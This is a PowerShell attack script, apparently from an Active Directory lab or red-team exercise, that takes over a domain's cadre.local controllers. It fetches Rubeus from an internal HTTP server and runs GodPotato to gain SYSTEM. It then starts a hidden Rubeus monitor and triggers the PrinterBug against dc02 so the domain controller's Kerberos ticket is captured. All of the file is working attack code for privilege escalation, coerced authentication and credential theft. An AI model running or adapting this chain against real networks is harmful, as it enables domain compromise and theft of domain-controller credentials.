[CmdletBinding()]
param(
    [string]$TargetDC = "dc02.child.cadre.local",
    [string]$Listener = "mbr01.child.cadre.local"
)
$ErrorActionPreference = "Stop"
try {
    $outDir = "C:\Tools\cadre-attack"
    New-Item -ItemType Directory -Path $outDir -Force | Out-Null

    $rubeus = "$outDir\Rubeus.exe"
    $msrprn = "C:\Tools\ADTools\MS-RPRN.exe"
    $godpotato = "C:\Tools\ADTools\GodPotato.exe"
    if (-not (Test-Path $msrprn)) { throw "MS-RPRN.exe not found" }
    if (-not (Test-Path $godpotato)) { throw "GodPotato.exe not found" }

    if (-not (Test-Path $rubeus)) {
        Invoke-WebRequest -Uri "http://192.168.77.60:8888/Rubeus.exe" -OutFile $rubeus -UseBasicParsing
    }

    $output = "$outDir\dc02_tgs.txt"
    if (Test-Path $output) { Remove-Item $output -Force }

    # Write a .cmd wrapper to avoid quoting hell inside GodPotato -cmd
    $monitorCmd = "$outDir\rubeus_monitor.cmd"
    @"
@powershell -NoProfile -Command "if (Get-Process Rubeus -ErrorAction SilentlyContinue) { Stop-Process -Name Rubeus -Force -ErrorAction SilentlyContinue }; Start-Process -FilePath '$rubeus' -ArgumentList 'monitor /targetuser:DC02$ /interval:5 /filtername:DC02$ /output:$output' -WindowStyle Hidden"
"@ | Out-File -FilePath $monitorCmd -Encoding ASCII

    # Start Rubeus monitor as SYSTEM via GodPotato
    & $godpotato -cmd "cmd /c $monitorCmd" 2>&1 | Out-Null

    Start-Sleep -Seconds 3

    # Trigger PrinterBug from mbr01 against dc02 -> listener mbr01
    & $msrprn "\\$TargetDC" "\\$Listener" 2>&1 | Out-Null

    Start-Sleep -Seconds 6

    # Stop Rubeus monitor
    Stop-Process -Name Rubeus -Force -ErrorAction SilentlyContinue

    if (Test-Path $output) {
        $content = Get-Content $output -Raw
        if ($content -and $content.Contains("KIRBI")) {
            Write-Output "T102_OK: captured DC02$ TGS on mbr01 as SYSTEM"
            Write-Output $content
        } else {
            Write-Output "T102_INFO: Rubeus monitor ran but no KIRBI captured yet"
            if ($content) { Write-Output $content }
        }
    } else {
        Write-Output "T102_INFO: no output file yet"
    }
} catch {
    Write-Output ("T102_FAIL: " + $_.Exception.Message)
    exit 1
}
